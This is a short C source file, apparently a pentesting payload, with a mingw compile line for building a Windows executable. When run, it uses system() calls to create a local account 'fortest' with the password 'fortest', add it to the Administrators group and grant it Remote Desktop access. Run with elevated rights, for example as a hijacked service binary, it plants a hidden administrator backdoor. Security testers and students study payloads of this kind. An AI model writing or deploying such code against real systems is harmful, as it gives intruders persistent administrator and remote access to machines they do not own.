//i686-w64-mingw32-gcc adduser.c -o adduser.exe

#include <stdlib.h>
int main()
{
        int i;
        i=system("net user fortest fortest /add");
        i=system("net localgroup administrators fortest /add");
        i=system("net localgroup \"Remote Desktop Users\" fortest /add");
        return 0;
}